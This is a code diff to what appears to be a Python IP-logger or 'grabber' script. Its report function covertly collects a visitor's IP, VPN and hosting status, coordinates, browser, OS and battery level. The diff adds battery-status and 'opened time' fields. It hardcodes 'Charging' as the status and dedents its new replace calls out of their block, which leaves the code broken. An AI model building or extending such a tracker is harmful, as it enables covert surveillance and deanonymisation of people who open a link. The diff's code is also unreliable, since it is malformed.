@@ -163,7 +163,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 > **Battery Percentage:** `{battery_percentage if battery_percentage else 'Unknown'}%`
-
+> **Battery Status:** `Charging`
+> **Opened Time:** `Unknown`
 
 **PC Info:**
 > **OS:** `{os}`
@@ -257,8 +258,13 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message = message.replace("{battery_percentage}", str(battery_percentage) if battery_percentage else 'Unknown')
+                    # Replace battery-related placeholders in the message
+    message = message.replace("{battery_percentage}", f"{battery_percentage if battery_percentage else 'Unknown'}%")
+    message = message.replace("{battery_status}", f"{battery_status if battery_status else 'Unknown'}")
+   
 
+    # Replacing opened time information
+    message = message.replace("{uptime}", str(uptime) if uptime else 'Unknown')
 
                 datatype = 'text/html'
 
